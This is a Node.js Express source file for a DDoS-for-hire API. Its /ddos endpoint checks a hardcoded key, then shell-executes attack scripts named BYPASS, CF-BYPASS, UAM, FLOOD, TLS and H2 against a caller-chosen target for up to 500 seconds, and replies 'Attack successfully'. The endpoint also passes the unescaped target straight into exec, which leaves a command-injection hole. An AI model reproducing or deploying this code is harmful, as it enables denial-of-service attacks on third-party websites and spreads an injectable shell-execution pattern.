const express = require("express");
const fs = require("fs");
const url = require('url');
const path = require("path");
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const cors = require('cors');
const crypto = require('crypto');
const pino = require("pino");

const app = express();
const PORT = process.env.PORT || 2007;

let totalRequests = 0;

setInterval(() => {
  totalRequests = 0;
}, 5000);

app.post("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time } = req.body;
    
    if (!key || !metode || !target || !time) {
      return res.status(400).json({
        status: false,
        message: "Required parameters: key, metode, target, time"
      });
    }
    
    if (key !== "Alwayshanz") {
      return res.status(403).json({
        status: false,
        message: "Incorrect API key"
      });
    }
    
    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({
        status: false,
        message: "Time must be 1 - 500 seconds"
      });
    }
    
    const validMethods = [
      "BYPASS", "CIBI", "FLOOD", "GLORY",
      "HTTPS", "HTTPX", "HTTP-X", "RAW",
      "TLS", "UAM", "CF", "H2", "CF-BYPASS"
    ];
    
    if (!validMethods.includes(metode)) {
      return res.status(400).json({
        status: false,
        message: "Method not supported"
      });
    }
    
    const command = `node ${metode}.js ${target} ${duration}`;
    exec(command, {
      cwd: path.join(__dirname, "methods"),
      timeout: (duration + 10) * 1000
    }, (error, stdout, stderr) => {
      if (error) console.error(`Command error: ${error.message}`);
      if (stderr) console.warn(`Command stderr: ${stderr}`);
      if (stdout) console.log(`Command output: ${stdout}`);
    });
    
    return res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      Message: "Attack successfully"
    });
    
  } catch (err) {
    console.error("DDoS endpoint error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

